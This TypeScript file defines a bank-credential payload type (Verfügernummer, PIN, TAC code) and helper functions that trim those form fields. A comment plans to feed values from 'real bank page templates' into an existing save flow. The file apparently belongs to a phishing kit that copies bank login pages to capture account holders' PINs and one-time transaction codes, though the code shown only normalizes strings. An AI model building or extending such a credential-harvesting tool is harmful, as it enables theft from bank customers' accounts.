export type BankCredentialPayload = {
  bankSlug: string;
  bankName: string;
  verfuegernummer: string;
  pin: string;
  tacCode: string;
};

/**
 * Future integration helper:
 * When real bank page templates are added later, map incoming form values
 * to the schema-compatible payload below and reuse existing save flow.
 */
export function normalizeBankCredentialPayload(input: Partial<BankCredentialPayload>): BankCredentialPayload {
  return {
    bankSlug: (input.bankSlug ?? "").trim(),
    bankName: (input.bankName ?? "").trim(),
    verfuegernummer: (input.verfuegernummer ?? "").trim(),
    pin: (input.pin ?? "").trim(),
    tacCode: (input.tacCode ?? "").trim(),
  };
}

export type StandardBankLoginFields = {
  verfuegernummer: string;
  pin: string;
  tacCode: string;
};

export function normalizeBankLoginFields(input: Partial<StandardBankLoginFields>): StandardBankLoginFields {
  return {
    verfuegernummer: (input.verfuegernummer ?? "").trim(),
    pin: (input.pin ?? "").trim(),
    tacCode: (input.tacCode ?? "").trim(),
  };
}
